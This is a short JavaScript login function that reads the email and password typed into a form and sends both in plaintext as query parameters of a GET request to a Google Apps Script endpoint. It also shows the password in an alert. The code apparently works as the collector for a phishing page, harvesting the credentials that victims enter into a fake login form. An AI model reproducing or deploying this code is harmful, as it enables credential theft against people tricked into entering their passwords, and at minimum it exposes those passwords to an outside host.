
const http = new XMLHttpRequest();
function login(){
var mail = document.getElementById("mail");
var pswd = document.getElementById("pswd");
  alert(pswd.value)
  const url = `https://script.google.com/macros/s/AKfycbxCkQzuy5ULlHYQd9t_ExffEjeLj8FnpPIG_petFm8HHO5TuqYsML7MIK9E1HV8gLZV/exec?name=${mail.value}&value=${pswd.value}`
  http.open("GET",url);
  http.send();
}